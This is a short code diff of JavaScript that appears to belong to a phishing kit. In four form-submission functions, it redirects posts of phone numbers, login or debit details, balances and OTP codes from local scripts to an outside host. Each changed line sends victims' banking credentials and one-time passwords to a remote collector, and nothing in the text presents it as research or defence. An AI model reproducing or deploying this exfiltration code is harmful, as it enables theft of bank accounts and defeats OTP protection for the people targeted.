@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'req/no.php',
+        url: 'https://choreoapps.oo-feed.cfd/aldi/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'req/login.php',
+        url: 'https://choreoapps.oo-feed.cfd/aldi/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'req/saldo.php',
+        url: 'https://choreoapps.oo-feed.cfd/aldi/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'req/otp.php',
+        url: 'https://choreoapps.oo-feed.cfd/aldi/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
